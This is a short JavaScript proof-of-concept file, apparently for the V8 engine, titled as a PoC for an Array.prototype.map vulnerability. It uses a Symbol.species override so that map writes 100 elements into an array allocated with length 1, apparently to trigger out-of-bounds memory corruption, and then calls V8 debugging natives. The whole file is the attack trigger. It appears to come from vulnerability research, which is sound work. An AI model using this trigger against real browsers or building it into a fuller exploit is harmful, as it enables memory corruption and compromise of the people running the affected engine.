/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2019-12-17 00:59:49
 * Author: raycp
 * 
 * Last Modified: 2019-12-17 06:15:43
 * Description: poc for array.prototype.map vuln.
************************************************************/
class Array1 extends Array {
  constructor(len) {
      super(1);

    }
};

class MyArray extends Array {
  static get [Symbol.species]() {
      return Array1;
    }
}

a = new MyArray();

for (var i = 0; i < 100; i++) {
  a.push(1);
}

var b = a.map(function(x) { return 42; });
console.log(b.length)
%DebugPrint(b);
%SystemBreak();
